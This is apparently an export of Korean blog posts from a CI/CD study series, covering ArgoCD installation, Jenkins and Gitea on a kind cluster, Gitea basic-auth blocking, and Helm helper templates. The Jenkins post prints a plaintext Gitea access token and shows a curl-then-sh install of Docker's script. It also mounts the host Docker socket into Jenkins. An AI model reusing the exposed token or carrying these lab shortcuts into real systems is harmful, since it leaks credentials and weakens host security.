얻어야합니다.\n# e.g. apiVersion: v1 kind: Secret metadata: name: cluster-credentials-dev namespace: argocd labels: argocd.argoproj.io/secret-type: cluster # Label 설정에 유의 stringData: name: dev-cluster # Argo CD 내에서 표시될 클러스터 이름 server: https://123.45.67.89:6443 # 대상 클러스터의 API 서버 주소 config: | # JSON 형태의 kubeconfig 일부. Argo CD가 인증에 사용 { \u0026#34;bearerToken\u0026#34;: \u0026#34;eyJhbGciOiJSUzI1NiIsImtpZCI6...\u0026#34;, # 대상 클러스터의 ServiceAccount로부터 추출한 토큰 \u0026#34;tlsClientConfig\u0026#34;: { \u0026#34;insecure\u0026#34;: false, # true일 경우 TLS 검증 비활성화 (개발용) \u0026#34;caData\u0026#34;: \u0026#34;LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0t...\u0026#34; # 클러스터 CA 인증서 (Base64 인코딩된 값) } } 이는 위의 YAML 형태외에도 CLI 명령어로도 가능합니다.\nargocd cluster add \u0026lt;CONTEXT_NAME\u0026gt; --name \u0026lt;CLUSTER_ALIAS\u0026gt; (2) ArgoCD Helm Chart 설치 Helm Chart의 일반적인 배포방식이며, 아래와 같습니다.\nArgoCD를 배포할 네임스페이스 생성 각 Kubernetes 환경에 맞는 values.yaml 파일 작성 배포 후 확인 파일은 아래 경로에 있습니다.\n해당 구성들은 4w/shells/argocd 폴더에 탑재되어 있습니다.\n# pwd # # /home/kkumtree/Documents/github/ci-cd-cloudnet-study/4w/shells/argocd # ls # # argocd-values.yaml deploy-chart.sh ./deploy-chart.sh 각 구성요소를 확인해보겠습니다.\nkubectl get pod,svc,ep,secret,cm -n argocd kubectl get crd | grep argo kubectl get appproject -n argocd -o yaml kubectl get sa -n argocd 권한도 보겠습니다.\n아래 커맨드를 위해서 krew 플러그인 매니저가 설치되어 있어야 합니다.\n4w/shells/krew/install-krew-bash-zsh.sh 스크립트로도 설치할 수 있습니다.\n# kubectl krew install rolesum kubectl rolesum -k User system:kube-proxy kubectl rolesum -k Group system:masters Role Binding / Cluster Role Binding 도 확인해봅니다\nkubectl rolesum -n argocd argocd-server # kubectl rolesum -n argocd argocd-application-controller # kubectl rolesum -n argocd argocd-applicationset-controller # kubectl rolesum -n argocd argocd-repo-server ArgoCD 최초 암호 확인은 아래와 같이 합니다.\nkubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath=\u0026#34;{.data.password}\u0026#34; | base64 -d ;echo (3) Testing with sample app 샘플 어플리케이션 guestbook을 배포 후, ArgoCD 대시보드를 통해 변화를 관찰해봅니다.\n# 4w/yaml/guestbook 폴더로 이동 kubectl apply -f guestbook.yaml 해당 서비스가 kind 클러스터의 노출된 30003 포트로 접근 가능하도록 시도해보겠습니다.\nkubectl get svc -n guestbook kubectl patch svc -n guestbook guestbook-helm-guestbook -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;NodePort\u0026#34;,\u0026#34;ports\u0026#34;:[{\u0026#34;port\u0026#34;:80,\u0026#34;targetPort\u0026#34;:80,\u0026#34;nodePort\u0026#34;:30003}]}}\u0026#39; kubectl get svc -n guestbook kubectl patch svc -n guestbook guestbook-helm-guestbook -p \u0026#39;{\u0026#34;spec\u0026#34;:{\u0026#34;type\u0026#34;:\u0026#34;NodePort\u0026#34;,\u0026#34;ports\u0026#34;:[{\u0026#34;port\u0026#34;:80,\u0026#34;targetPort\u0026#34;:80,\u0026#34;nodePort\u0026#34;:30003}]}}\u0026#39; kubectl get svc -n guestbook 변화가 없는 것을 확인할 수 있습니다.\n왜냐하면, ArgoCD의 Self healing으로 동기화되고 있기 때문입니다.\n이를 바꾸기위해, 웹 콘솔에서 Self healing을 비활성화하고 사용하면 됩니다.\n(4) ArgoCD 웹 콘솔에서 Pod Terminal 사용 활성화 Jenkins의 경우에는 웹 콘솔에서 Pod에 접속할 터미널이 없었던 것으로 알고있는데,\nRBAC을 포함한 활성화 설정으로, 웹 콘솔에서 현재 배포된 Pod의 내부에 접근할 수 있습니다.\n# (ArgoCD Pod) exec 기능 활성화 kubectl get configmap argocd-cm -n argocd -o yaml | grep exec.enabled kubectl patch configmap argocd-cm -n argocd --type merge -p \u0026#39;{\u0026#34;data\u0026#34;:{\u0026#34;exec.enabled\u0026#34;:\u0026#34;true\u0026#34;}}\u0026#39; kubectl get configmap argocd-cm -n argocd -o yaml | grep exec.enabled # 활성화 확인 # (RBAC) CR에 pods/exec 생성권한 추가 kubectl rolesum -n argocd argocd-server | head -n 5 # argocd-server의 Role Binding 확인 kubectl describe clusterroles.rbac.authorization.k8s.io argocd-server | grep pods # pods/exec 없음 확인 kubectl patch clusterrole argocd-server --type=\u0026#39;json\u0026#39; \\ -p=\u0026#39;[{\u0026#34;op\u0026#34;: \u0026#34;add\u0026#34;, \u0026#34;path\u0026#34;: \u0026#34;/rules/-\u0026#34;, \u0026#34;value\u0026#34;: {\u0026#34;apiGroups\u0026#34;: [\u0026#34;\u0026#34;], \u0026#34;resources\u0026#34;: [\u0026#34;pods/exec\u0026#34;], \u0026#34;verbs\u0026#34;: [\u0026#34;create\u0026#34;]}}]\u0026#39; kubectl describe clusterroles.rbac.authorization.k8s.io argocd-server | grep pods # pods/exec create 확인 이후에 웹 콘솔로 접속 시, Pod에 대해 웹 Terminal로 접근이 가능한 점을 확인할 수 있습니다.\n(5) ArgoCD CLI 유사시, 커맨드라인으로 ArgoCD와 API 통신을 하기 위해 ArgoCD CLI를 설치 후 사용해봅니다.\n(Linux/Curl방식: Download With Curl)\n초기 비밀번호로 사용하는 것은 권장되는 방법은 아니나\n원격으로 해당 클러스터에 붙어서 실습 중이었기에, 편의 상 아래와 같이 진행했습니다.\nkubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath=\u0026#34;{.data.password}\u0026#34; | base64 -d ;echo argocd login 127.0.0.1:30002 --plaintext argocd account list argocd proj list argocd repo list argocd cluster list argocd app list 3. ArgoCD Autopilot https://github.com/argoproj-labs/argocd-autopilot\nArgo CD Autopilot Introduction/Codefresh\nJenkins가 되었든 ArgoCD가 되었든, 자기 자신을 자동으로 sync 관리 하기가 어려운 경우가 있습니다.\n이번에는 ArgoCD Autopilot을 가볍에 알아보겠습니다.\n제안 문서도 참고하여 확인 후 살펴봤을 때, Autopilot의 목적은 ArgoCD를 Bootstrap화 하는 것으로 이해했습니다.\n배포하면서 Argo CD에 대한 템플릿도 git 레포에 업로드한 후, 이 또한 ArgoCD가 조회하며 sync를 맞추는 것으로 파악됩니다.\n다양한 제안이 있는 것으로 보이며, 앞으로도 업데이트 될 사안이 많아 보였습니다.\n","date":"2025-11-09T08:44:34+09:00","permalink":"https://blog.minseong.xyz/post/argocd-hello-world/","section":"post","tags":["argocd","CICD","CloudNet@"],"title":"ArgoCD 101 - CI/CD 스터디 4주차"},{"categories":null,"contents":"CloudNet@에서 진행하고 있는 CI/CD Study 3주차에는 Jenkins와 ArgoCD을 다뤘습니다.\n이번에는 kubernetes(이하, k8s)에 self-host Git과 Jenkins를 배포 후 CI/CD 부분을 다루도록 하겠습니다.\n하다보니 개인적으로, 아래 3가지가 주로 기억에 남았던 것 같습니다.\nDocker UDS의 GID Gitea와 Multibranch Pipeline의 결합 Local PV의 Taint 및 Node 지정 더불어, Gitea에 대해 Basic Auth를 통한 CLI 접근을 막아보는 것도 새로이 해보았습니다.\n해당 구성들은 아래 GitHub에 탑재되어 있습니다.\nhttps://github.com/kkumtree/ci-cd-cloudnet-study 의 3w 폴더\n0. 실습 준비 (1) kind kind 설치의 경우 다음 포스트를 참고할 수 있습니다.\n리눅스에 KIND 설치하기 w/golang\nDocs: https://kind.sigs.k8s.io/\nkind를 통해, 로컬 환경에 k8s를 배포해보겠습니다.\nnetworking.apiServerAddress:\nControlPlane에 접속하기 위한 주소 지정 nodes.extraPortMappings:\n호스트의 포트를 kind의 각 노드 포트로 직접 연결 설정.\n이를 통해, 호스트에서 kind 내부의 NodePort 서비스에 접근 가능 # 3w/shells/kind/up-kind.sh kind create cluster --name myk8s --image kindest/node:v1.32.8 --config - \u0026lt;\u0026lt;EOF kind: Cluster apiVersion: kind.x-k8s.io/v1alpha4 networking: apiServerAddress: \u0026#34;0.0.0.0\u0026#34; nodes: - role: control-plane extraPortMappings: - containerPort: 30000 hostPort: 30000 - containerPort: 30001 hostPort: 30001 - containerPort: 30002 hostPort: 30002 - containerPort: 30003 hostPort: 30003 - role: worker EOF 아래의 명령어로 ~/.kube/config 권한 인증이 로드된 것을 확인합니다.\nkubectl get pod -v6 cat ~/.kube/config | grep 0.0.0.0 docker ps docker images | grep kindest (2) kube-ops-view 설치 아래 커맨드를 입력하여 시각화 툴인 kube-ops-view를 설치합니다.\nhelm repo add geek-cookbook https://geek-cookbook.github.io/charts/ helm install kube-ops-view geek-cookbook/kube-ops-view --version 1.2.2 --set service.main.type=NodePort,service.main.ports.http.nodePort=30001 --set env.TZ=\u0026#34;Asia/Seoul\u0026#34; --namespace kube-system export NODE_PORT=$(kubectl get --namespace kube-system -o jsonpath=\u0026#34;{.spec.ports[0].nodePort}\u0026#34; services kube-ops-view) export NODE_IP=$(kubectl get nodes --namespace kube-system -o jsonpath=\u0026#34;{.items[0].status.addresses[0].address}\u0026#34;) echo http://$NODE_IP:$NODE_PORT # echo http://$NODE_IP:$NODE_PORT/#scale=2 # 배율 1. 각 어플리케이션 설정 Docker compose로 Jenkins 및 Gitea 배포하고 각각에 대한 설정을 해봅니다.\n(1) 기본 배포 및 Jenkins 설정 # 3w/cicd-labs/docker-compose.yaml # 아래 파일을 docker compose up -d 로 배포 services: jenkins: container_name: jenkins image: jenkins/jenkins:lts restart: unless-stopped networks: - cicd-network ports: - \u0026#34;8080:8080\u0026#34; - \u0026#34;50000:50000\u0026#34; volumes: - /var/run/docker.sock:/var/run/docker.sock - jenkins_home:/var/jenkins_home # privileged: true gitea: container_name: gitea image: docker.gitea.com/gitea:1.25.0 restart: unless-stopped networks: - cicd-network ports: - \u0026#34;10022:22\u0026#34; - \u0026#34;3000:3000\u0026#34; volumes: - ./gitea-data:/data - /etc/timezone:/etc/timezone:ro - /etc/localtime:/etc/localtime:ro environment: - USER_UID=1000 - USER_GID=1000 volumes: jenkins_home: gitea-data: networks: cicd-network: driver: bridge jenkins에 볼륨을 **./**jenkins_home:/var/jenkins_home으로 했을 경우, permission error가 발생합니다.\n이후 정상적으로 배포되었는지 확인 후, Jenkins Admin 패스워드를 확인합니다.\nfor i in gitea jenkins ; do echo \u0026#34;\u0026gt;\u0026gt; container : $i \u0026lt;\u0026lt;\u0026#34;; docker compose exec $i sh -c \u0026#34;whoami \u0026amp;\u0026amp; pwd\u0026#34;; echo; done 세팅할 때는 컨테이너가 Host에 접속할 수 있는 IP를 찾아서 변경합니다.\n# 실습시 공유기 대역이 192.168.1.1/24 이었으므로, 해당 대역 검색 후 적용 ifconfig | grep 192.168 -C1 # USB무선랜을 사용 중이어서, wlx로 시작되는 주소 사용 # virbr0: flags=4099\u0026lt;UP,BROADCAST,MULTICAST\u0026gt; mtu 1500 # inet 192.168.122.1 netmask 255.255.255.0 broadcast 192.168.122.255 # ether 52:54:00:a3:a7:2c txqueuelen 1000 (Ethernet) # -- # wlx909f33eeed74: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 # inet 192.168.1.25 netmask 255.255.255.0 broadcast 192.168.1.255 # inet6 fe80::14af:e:a003:b5ab prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; 또는 컨테이너들이 배포된 Docker 브릿지 주소를 활용할 수 있습니다.\ndocker inspect gitea | grep Gateway # \u0026#34;Gateway\u0026#34;: \u0026#34;\u0026#34;, # \u0026#34;IPv6Gateway\u0026#34;: \u0026#34;\u0026#34;, # \u0026#34;Gateway\u0026#34;: \u0026#34;172.27.0.1\u0026#34;, # \u0026#34;IPv6Gateway\u0026#34;: \u0026#34;\u0026#34;, ifconfig | grep 172.27 # inet 172.27.0.1 netmask 255.255.0.0 broadcast 172.27.255.255 (2) Jenkins의 Docker-out-of-Docker(DooD) 설정 일반적인 DinD 으로 배포하려면, privileged 권한을 올려줘야합니다.\n더불어 여러 Job이 돌는 상황에는 그닥\u0026hellip;\n그래서, 아래와 같은 구조로 바꾸기 위해 재구성합니다.\nflowchart LR A --\u0026gt; B --\u0026gt; C A[Jenkins Container 내의 Docker Client] B[Docker UDS를 통해 Host Daemon에 접근] C[Host에 새로운 컨테이너 Deploy] UDS로 접근하려면, Jenkins Container에 아래의 수정을 가합니다.\nDocker client 설치 jenkins 유저에도 docker 실행권한 부여 그룹 생성 및 유저 추가 jenkins:docker ## 상승된 root 권한으로 접근 docker compose exec --privileged -u root jenkins bash ## jenkins 컨테이너 내에서 Docker Engine 설치 및 권한 부여 id # 현재 권한 확인 # uid=0(root) gid=0(root) groups=0(root) ## Docker Engine 클라이언트 설치 ## https://get.docker.com/ 출력 값을 변경하여, CLI만 설치하였습니다. ## curl -fsSL https://get.docker.com -o get-docker.sh \u0026amp;\u0026amp; sh get-docker.sh --dry-run ## 실습 당시 이미지는 Debian 기반 ## `docker-ce-cli`에 유의합니다. apt-get -qq update \u0026gt;/dev/null DEBIAN_FRONTEND=noninteractive apt-get -y -qq install ca-certificates curl \u0026gt;/dev/null install -m 0755 -d /etc/apt/keyrings curl -fsSL \u0026#34;https://download.docker.com/linux/debian/gpg\u0026#34; -o /etc/apt/keyrings/docker.asc chmod a+r /etc/apt/keyrings/docker.asc echo \u0026#34;deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian $(. /etc/os-release \u0026amp;\u0026amp; echo \u0026#34;$VERSION_CODENAME\u0026#34;) stable\u0026#34; \u0026gt; /etc/apt/sources.list.d/docker.list apt-get -qq update \u0026gt;/dev/null DEBIAN_FRONTEND=noninteractive apt-get -y -qq install docker-ce-cli curl tree jq yq wget \u0026gt;/dev/null ## jenkins 유저에도 Docker 실행권한 부여 # 작성 중 휴먼에러로, Docker 소켓의 권한이 바뀌어 롤백 후 아래와 같이 수정하였습니다. stat -c \u0026#39;%g\u0026#39; /var/run/docker.sock groupadd -g $(stat -c \u0026#39;%g\u0026#39; /var/run/docker.sock) -f docker usermod -aG docker jenkins grep docker /etc/group grep jenkins /etc/group exit docker compose restart jenkins docker compose exec jenkins id docker compose exec jenkins docker info docker compose exec jenkins docker ps 다시 확인합니다.\nstat -c '%g' /var/run/docker.sock의 경우,\nHost의 GID와 맞추지 않을 경우, Host 소켓도 사용 불능이 되어, GID를 맞추는 작업입니다.\n(Privileged 모드여서 가능한 부분)\n(3) Gitea 설정 Server Domain과 Gitea 기본 URL을 Jenkins와 같이,\n호스트 IP(Docker Compose의 브릿지 게이트웨이)로 설정하였습니다.\ngrep localhost /etc/hosts # 127.0.0.1 localhost # ::1 ip6-localhost ip6-loopback open \u0026#34;http://127.0.0.1:3000\u0026#34; 당장의 접속은 localhost, 즉 127.0.0.1로도 무방합니다.\n추가로 관리자 계정도 설정합니다(옵션).\n(4) Docker Token 생성 Docker에서 Personal Access Token(PAT)을 생성합니다.\n(Read, Write, Delete 모든 권한을 부여했습니다)\ndckr_pat_\u0026lt;난수\u0026gt;_\u0026lt;난수\u0026gt; 형태를 가지며, 이 또한 메모해둡니다.\n2. 간단 배포 구성 Jenkins 컨테이너가 Gitea와 DockerHub에서 리소스를 받고,\n빌드 후 kind 클러스터에 배포하도록 해봅니다.\nflowchart LR A --\u0026gt; C --\u0026gt; D B --\u0026gt; C A[Gitea Repo Pull] B[Docker Hub Pull] C[Jenkins Build] D[Deploy in kind] (1) Gitea 소스코드 생성 Access Token을 활용하여, 평소와 같이 git clone/push를 해봅니다.\nAccess Token도 만들어봅시다.\n(우측 상단의 설정 \u0026gt; 어플리케이션)\n이때, Token Permission에서 repository에 대한 Read and Write를 활성화 합니다.\n다른 토큰들과 마찬가지로, 한번만 확인가능하니 따로 메모를 해둡니다.\nPrivate Repository들을 생성한 후에,\n토큰을 통해 호스트 IDE에서도 편집을 할수 있는지 확인해봅니다.\nTOKEN=1965eb8dbc1751a78d6f91dc9f0f8a8f9e48b1d8 TOKEN_NAME=devops HOSTIP=172.27.0.1 git clone http://$TOKEN_NAME:$TOKEN@$HOSTIP:3000/kkumtree/dev-app.git git clone git@172.27.0.1:kkumtree/dev-app.git test # 차단됨 확인 git clone http://172.27.0.1:3000/kkumtree/dev-app.git test # ID/PW 정상 입력시 받음 마지막 케이스의 경우 ID/PW로 접근이 가능한데, 추후 막아보겠습니다.\nHost IDE(VSCode)를 통해, 파일을 추가했습니다.\n## 실습파일 ## 3w/cicd-labs/dev-app # tree -a # . # ├── Dockerfile # ├── .gitignore # repo 생성 시, 함께 생성 # ├── Jenkinsfile # ├── README.md # ├── server.py # └── VERSION 평소 하듯이, 더하고 커밋하고 올려봅니다.\n이미, 토큰값이 있기 때문에 remote에 올라감을 알 수 있습니다.\n(2) Gitea 조직 생성 및 개인 Repository 소유권 이전 Jenkins 플러그인과의 연동을 위해서, 많은게 바뀌어서 설정을 다시 진행했습니다.\nORG 생성(선택/권장사항)\n새로운 조직을 클릭하여, 조직을 생성합니다.\n기존 Repository 소유권 이전\n기존 레포(e.g. dev-app) 설정 맨 아래에 소유권 이전을 클릭합니다.\n이때, 새 소유자는 새로 생성한 조직 이름으로 지정합니다.\nToken 재 생성\n조건 충족을 위해 아래의 권한을 부여합니다. read:organization # 조직 권한을 읽습니다. write:repository # repository 편집 권한. read:user # user의 정보를 읽습니다. (3) Jenkins 플러그인 설치 및 Token 주입 설치한 Plugin들은 아래와 같습니다.\nDocker Pipeline Pipeline: Stage View Gitea Gitea 서버 주소 및 토큰을 설정해봅니다.\n경로는 Manage -\u0026gt; System -\u0026gt; Gitea server 입니다.\n이전에 파악했던 Host IP와 포트번호를 입력합니다. 유효하면 Gitea 버전이 확인됩니다.\n(선택) Jenkins 및 Jenkins Node에서만 현재 상황을 파악할 수 있게 read-only 키를 별도 생성하였습니다.\nread:organization read:repository read:user New Item(혹은 Create a job) -\u0026gt; Orgnization Folder를 선택합니다.\nProject -\u0026gt; Repository Sources -\u0026gt; Gitea Organization 을 클릭 후, 앞서 지정한 Server를 선택합니다.\nBehaviours는 Discover branches의 기본 Strategy 외에 제거합니다.\n이후 Repository Write 권한이 있는 Credential을 추가하기 위해, Add -\u0026gt; cicd-labs를 클릭합니다.\nOwner는 Token 발급 유저, 혹은 유저가 속한 Organization 이름을 기입합니다.\nKind에서 Gitea Personal Access Token 선택 후, 임의 ID 지정 후 저장합니다.\n저장하면, organization(혹은, User)의 repository, branch 정보를 읽어옵니다.\n마지막으로 Docker Token도 저장합니다.\n(Username and password. Username은 Docker 계정명)\n(4) 파이프라인 구성 기존의 dev-app에 Jenkinsfile을 생성 후, Push 합니다.\nJenkins Organization에서 Scan Gitea Organizaton Now 클릭 후,\nLog를 조회하면, Jenkinsfile을 발견했다고 하면서, Build를 시작합니다.\n상세를 보면, 빌드가 성공한 것을 확인할 수 있습니다.\nDocker Hub에도 정상 게시된 것을 확인할 수 있습니다.\n(5) Helm으로 수동 배포 해당 이미지를 가지고 Helm 파일로 만들어 배포를 해보았습니다.\n실습 파일들은 /3w/helm 에 있습니다.\n# tree # . # ├── Chart.yaml # ├── templates # │ ├── deployment.yaml # │ └── service.yaml # └── values.yaml helm install timeserver . for i in {1..100}; do curl -s http://127.0.0.1:30000 | grep name; done | sort | uniq -c | sort -nr 2개의 파드에서 분산되는 것을 확인하였습니다.\nreplica를 4개로 늘려둔 후에도 골고루 분산되는 것을 알 수 있었습니다.\nfor i in {1..100}; do curl -s http://127.0.0.1:30000 | grep name; done | sort | uniq -c | sort -nr # 30 Server hostname: timeserver-85b54fcbb5-dk7rg # 26 Server hostname: timeserver-85b54fcbb5-kgv27 # 24 Server hostname: timeserver-85b54fcbb5-dm5fp # 20 Server hostname: timeserver-85b54fcbb5-bp4p6 애플리케이션 0.0.1 버전에서 0.0.2 버전으로 소스코드를 변경한 후, 이를 Jenkins가 빌드한 이미지를 배포 해봅니다.\ngit push 이후 Scan Multibranch Pipeline Now를 클릭하면 Docker Hub에 새 버전의 이미지 태그가 생성된 것 확인할 수 있습니다.\n다시 helm 변수를 바꿔서 배포해봅니다.\n새로운 버전의 Pod가 생성된 뒤, 기존 버전의 Pod가 순차적으로 사라짐을 확인하였습니다.\nhelm upgrade timeserver --reuse-values --set image.tag=\u0026#34;0.0.2\u0026#34; . 3. kind cluster에 Jenkins 배포해보기 대부분은 Jenkins의 문서를 참조하였습니다만,\n로컬(Kind)환경에 구성하다보니 다소 손을 봐야하는 부분을 다루어야 합니다.\n실습 파일들은 /3w/jenkins-on-kind 에 있습니다.\n# tree # . # ├── jenkins-01-volume.yaml # ├── jenkins-01-volume.yaml.default # 변경 비교를 위한 파일 # ├── jenkins-02-sa.yaml # ├── jenkins-values.yaml # └── jenkins-values.yaml.default # 변경 비교를 위한 파일 (1) Helm 템플릿 다운로드 및 배포 curl https://raw.githubusercontent.com/jenkins-infra/jenkins.io/master/content/doc/tutorials/kubernetes/installing-jenkins-on-kubernetes/jenkins-01-volume.yaml -o jenkins-01-volume.yaml curl https://raw.githubusercontent.com/jenkins-infra/jenkins.io/master/content/doc/tutorials/kubernetes/installing-jenkins-on-kubernetes/jenkins-02-sa.yaml -o jenkins-02-sa.yaml curl https://raw.githubusercontent.com/jenkinsci/helm-charts/main/charts/jenkins/values.yaml -o jenkins-values.yaml cp jenkins-01-volume.yaml jenkins-01-volume.yaml.default cp jenkins-values.yaml jenkins-values.yaml.default 아래와 같이 부분적으로 변경하여야합니다.\nLocal PV 폴더 생성 후, 권한 부여합니다. jenkins-01-volume.yaml에 의해서, 로컬 볼륨을 /data/jenkins-volume 으로 지정\nsudo mkdir -p /data/jenkins-volume sudo chown -R 1000:1000 /data/jenkins-volume local로 바꾸고, nodeAffinity를 부여하여 Control Plane Taint 에러를 해소합니다.\n이 경우에는 Worker Node를 특정하여, 해당 노드에만 Jenkins가 배포되게 지정했습니다.\ndiff jenkins-01-volume.yaml jenkins-01-volume.yaml.default # 13c13 # \u0026lt; local: # --- # \u0026gt; hostPath: # 15,22d14 # \u0026lt; nodeAffinity: # \u0026lt; required: # \u0026lt; nodeSelectorTerms: # \u0026lt; - matchExpressions: # \u0026lt; - key: kubernetes.io/hostname # \u0026lt; operator: In # \u0026lt; values: # \u0026lt; - myk8s-worker (2) values.yaml 수정 앞서 PV 및 SA를 생성하였으므로 values에 이를 비활성화 하고,\nNodePort로 열어두며, namespace를 jenkins로 지정해둡니다.\ndiff jenkins-values.yaml jenkins-values.yaml.default # 4d3 # \u0026lt; name: jenkins # 226,227c225 # \u0026lt; serviceType: NodePort # \u0026lt; # serviceType: ClusterIP # --- # \u0026gt; serviceType: ClusterIP # 236c234 # \u0026lt; nodePort: 30003 # kind 배포 시, 열어두었던 nodePort 사용 # --- # \u0026gt; nodePort: # 1273c1271 # \u0026lt; storageClass: jenkins-pv # --- # \u0026gt; storageClass: # 1339,1340c1337 # \u0026lt; create: false # \u0026lt; # create: true # --- # \u0026gt; create: true # 1344c1341 # \u0026lt; name: jenkins # --- # \u0026gt; name: (3) 배포 및 진입 # Helm Chart 추가 helm repo add jenkinsci https://charts.jenkins.io helm repo update kubectl apply -f jenkins-01-volume.yaml kubectl apply -f jenkins-02-sa.yaml helm install jenkins -n jenkins -f jenkins-values.yaml jenkinsci/jenkins # 출력 암호 kubectl exec --namespace jenkins -it svc/jenkins -c jenkins -- /bin/cat /run/secrets/additional/chart-admin-password \u0026amp;\u0026amp; echo # 노드 포트 및 IP 주소를 통해 주소 획득 export NODE_PORT=$(kubectl get --namespace jenkins -o jsonpath=\u0026#34;{.spec.ports[0].nodePort}\u0026#34; services jenkins) export NODE_IP=$(kubectl get nodes --namespace jenkins -o jsonpath=\u0026#34;{.items[0].status.addresses[0].address}\u0026#34;) echo http://$NODE_IP:$NODE_PORT 마지막 출력 값을 주소창에 넣어 접속합니다.\n(2) Jenkins 내부 설정 리버스 프록시에 문제가 있으므로 다시 Jenkins URL을 http://$NODE_IP:$NODE_PORT로 수정합니다.\n(관리 \u0026gt; System \u0026gt; Jenkins URL )\n플러그인은 이렇게 설치합니다.\nDocker Pipeline Pipeline: Stage View Gitea Gitea PAT Kubernetes Credentials 9. (Gitea) Basic Auth 차단 앞서, ID 및 PW로 접속이 가능한 점을 확인했으니\n이러한 Basic Auth 로 git에 접근하는 것만 차단해보겠습니다.\ndocker compose exec gitea sh -c \u0026#39;echo $GITEA_CUSTOM\u0026#39; ls grep -F \u0026#39;gitea-data:\u0026#39; docker-compose.yaml -n -B1 ls ./gitea-data/gitea/conf/app.ini grep -F \u0026#39;[service]\u0026#39; gitea-data/gitea/conf/app.ini -n -A 1 grep ENABLE_BASIC_AUTHENTICATION gitea-data/gitea/conf/app.ini # 환경변수가 없음을 확인 # 해당 환경 변수 추가에 대해 dryrun 후 apply sed \u0026#39;/\\[service\\]/a ENABLE_BASIC_AUTHENTICATION = false\u0026#39; gitea-data/gitea/conf/app.ini | \\ grep -F \u0026#39;[service]\u0026#39; -n -A 2 cp ./gitea-data/gitea/conf/app.ini ./gitea-data/gitea/conf/app.ini.bak.251102 # 백업본 생성 sed -i \u0026#39;/\\[service\\]/a ENABLE_BASIC_AUTHENTICATION = false\u0026#39; gitea-data/gitea/conf/app.ini # 이후, gitea 재시작하여 설정 값 적용 docker compose restart gitea 다시 시도하면, IP와 PW로 접근하는 것은 차단되었음을 확인하였습니다.\ngit clone http://172.27.0.1:3000/kkumtree/dev-app.git basic-auth-test # Cloning into \u0026#39;basic-auth-test\u0026#39;... # Username for \u0026#39;http://172.27.0.1:3000\u0026#39;: kkumtree # Password for \u0026#39;http://kkumtree@172.27.0.1:3000\u0026#39;: # remote: Unauthorized # fatal: Authentication failed for \u0026#39;http://172.27.0.1:3000/cicd-labs/dev-app/\u0026#39; Reference Docker/Jenkins How to Install and Run Jenkins With Docker Compose/CloudBees Docker inside Docker for Jenkins/ITNEXT Jenkins Docker-outside-of-Docker with Nexus Registry/NelsonMaty Ubuntu Tutorial: Jenkins + Gitea + Docker/TMVTech How to integrate Gitea and Jenkins/mike42.me Quick Jenkins Setup with Kubernetes in Docker(kind) and Helm in 5 minutes/PrincipalOfTech Kubernetes/Jenkins Configuration Cheat Sheet/Gitea Documentation ","date":"2025-11-02T08:51:39+09:00","permalink":"https://blog.minseong.xyz/post/jenkins-ci-cd-kubernetes/","section":"post","tags":["jenkins","gitea","helm","CICD","CloudNet@"],"title":"Jenkins, git and kubernetes - CI/CD 스터디 3주차"},{"categories":null,"contents":"이번에는 재사용성을 위해서 _helpers.tpl 파일을 활용해보겠습니다.\n기존의 Helm 101 - CI/CD 스터디 2주차에서 이어집니다.\n1. _helpers.tpl을 통한 공통 변수 재사용 (1) 공통사항 숙지 이전에 생성한 deployment.yaml과 service.yaml의 selector 부분에 공통점이 있습니다.\n# `{{ .Values.replicaCount }} ## deployment.yaml spec.selector.matchLabels spec.template.metadata.labels ## service.yaml spec.selector (2) 템플릿 생성 해당 label을 추가/삭제하려면, 여러 필드를 업데이트를 하여야합니다.\n대신 _helpers.tpl파일을 생성하여 구성읋 합니다.\n_helpers.tpl 뿐만 아니라, 맨 앞에 _로 시작하기만 하면 되며,\n이 파일은 k8s manifest 파일로 취급되지 않습니다.\n# 2w/sh## 2w/shells/helm-template/2-mv-and-create-new-tpl-dir.sh ells/helm-template/1-create-helm-helpers.sh cat \u0026lt;\u0026lt; EOF \u0026gt; templates/_helpers.tpl {{- define \u0026#34;pacman.selectorLabels\u0026#34; -}} app.kubernetes.io/name: {{ .Chart.Name}} {{- end }} EOF 위와 같이 함수를 정의하는 형태를 가집니다. (3) 기존 템플릿 변수 변경 기존의 파일들을 변경합니다.\n## 2w/shells/helm-template/2-helm-deployment.yaml ## 2w/shells/helm-template/3-helm-service.yaml # deployment.yaml 수정 (...) spec: replicas: {{ .Values.replicaCount }} selector: matchLabels: {{- include \u0026#34;pacman.selectorLabels\u0026#34; . | nindent 6 }} template: metadata: labels: {{- include \u0026#34;pacman.selectorLabels\u0026#34; . | nindent 8 }} # service.yaml 수정 selector: {{- include \u0026#34;pacman.selectorLabels\u0026#34; . | nindent 6 }} (...) 이후 _helpers.tpl에 정의한 공통 변수가 정상적으로 들어갔는지 확인합니다.\nhelm template . 2. 컨테이너 image 파일 업데이트 배포 파일에서 컨테이너 이미지를 갱신하고, 실핼 중인 인스턴스를 업그레이드 해보겠습니다.\n(1) 배포 우선 다시 배포해봅니다.\nhelm install pacman . helm history pacman kubectl get deploy -owide (2) image 태그 갱신 values.yaml 및 Chart.yaml에서 image 태그를 갱신해봅니다.\n(3) helm upgrade로 배포 아래와 같이 upgrade 명령어로 배포 합니다.\nhelm upgrade pacman . # Release \u0026#34;pacman\u0026#34; has been upgraded. Happy Helming! # NAME: pacman # LAST DEPLOYED: Sat Oct 25 23:58:23 2025 # NAMESPACE: default # STATUS: deployed # REVISION: 3 ## 리비전 번호가 하나 올라갑니다. # TEST SUITE: None helm history pacman kubectl get secret kubectl get deploy.replicaset -owide tag 및 appVersion 으로 필드가 나뉘어 있으나, 배포 상황에 맞게 취사선택하여 전략을 취할 수 있습니다. appVersion과 version은 서로 관계가 없음! appVersion: 애플리케이션을 변경할 때마다 업데이트 해야 함. version: 차트 버전이르모, 차트의 구조 등 정의가 변경되면 갱신함. (3) rollback 이전 버전으로 롤백합니다.\nimage 태그가 1.0.0으로 지정된 리비전이 1이었으므로 1로 롤백해보겠습니다.\nhelm history pacman helm rollback pacman 1 \u0026amp;\u0026amp; kubectl get pod -w helm history pacman kubectl get secret kubectl get deployment -owide kubectl get replicaset -owide 롤백을 하였어도, 기존 버전들은 남아있음을 알 수 